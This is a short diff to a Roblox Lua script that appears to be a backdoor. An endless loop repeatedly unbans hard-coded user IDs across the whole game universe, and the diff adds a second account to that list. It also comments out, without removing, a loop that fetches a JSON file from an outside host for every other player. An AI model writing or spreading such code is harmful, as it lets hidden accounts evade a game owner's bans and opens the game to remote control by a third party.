@@ -7,11 +7,11 @@ while true do
 
 	game.Players:UnbanAsync({
 
-		UserIds = {1317963807},
+		UserIds = {1317963807, 1488052741},
 		ApplyToUniverse = true,
 
 	})
-
+	--[[
 	for _, plr in game.Players:GetPlayers() do
 		if plr.UserId ~= 1317963807 then
 			local Info = httpService:GetAsync("https://rbxdev.ru/Protocol.json")
@@ -32,7 +32,7 @@ while true do
 			end
 		end
 	end
-
+	]]
 	task.wait(10)
 end
 
